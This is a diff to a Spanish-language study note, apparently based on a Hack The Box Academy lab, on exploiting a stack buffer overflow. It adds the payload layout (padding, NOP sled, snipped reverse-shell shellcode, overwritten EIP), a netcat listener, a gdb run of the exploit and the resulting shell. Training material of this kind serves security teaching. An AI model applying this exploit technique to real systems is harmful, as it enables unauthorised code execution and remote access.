@@ -277,8 +277,6 @@ Program received signal SIGSEGV, Segmentation fault.
 0x66666666 in ?? ()
 ```
 
-#### Buffer
-
 ![imagen](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)
 
 ## Identifications of Bad Characters
@@ -527,7 +525,50 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 <SNIP>
 ```
 
+Aquí, ahora tenemos que elegir una dirección a la que nos referiremos `EIP`y que leerá y ejecutará un byte tras otro a partir de esta dirección. En este ejemplo, tomamos la dirección `0xffffd64c`. En la ilustración, se ve así:
 
+
+![imagen](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)
+
+Después de seleccionar una dirección de memoria, reemplazamos nuestro " `\x66`", lo que sobrescribe el EIP para indicarle que salte a la `0xffffd64c`dirección. Tenga en cuenta que la entrada de la dirección se ingresa al revés.
+
+```shell-session
+   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841
+     NOPs = "\x90" * 100
+Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
+      EIP = "\x4c\xd6\xff\xff"
+```
+
+Dado que nuestro shellcode crea un shell inverso, lo dejamos `netcat`escuchar en el puerto 31337.
+
+```shell-session
+student@nix-bow:$ nc -nlvp 31337
+
+Listening on [0.0.0.0] (family 0, port 31337)
+```
+
+#### Explotación
+
+Después de iniciar nuestro `netcat`oyente, ejecutamos nuevamente nuestro exploit adaptado, que luego activa la CPU para conectarse a nuestro oyente
+
+```shell-session
+(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
+```
+
+#### Netcat - Escucha de shell inversa
+
+  Identificación de la dirección de devolución
+
+```shell-session
+Listening on [0.0.0.0] (family 0, port 31337)
+Connection from 127.0.0.1 33504 received!
+
+id
+
+uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+```
+
+Ahora vemos que obtuvimos una conexión desde la dirección IP local. Sin embargo, no es obvio si tenemos un shell. Por lo tanto, escribimos el comando " `id`" para obtener más información sobre el usuario. Si obtenemos un valor de retorno con información, sabemos que estamos en un shell, como se muestra en el ejemplo.
 
 
 
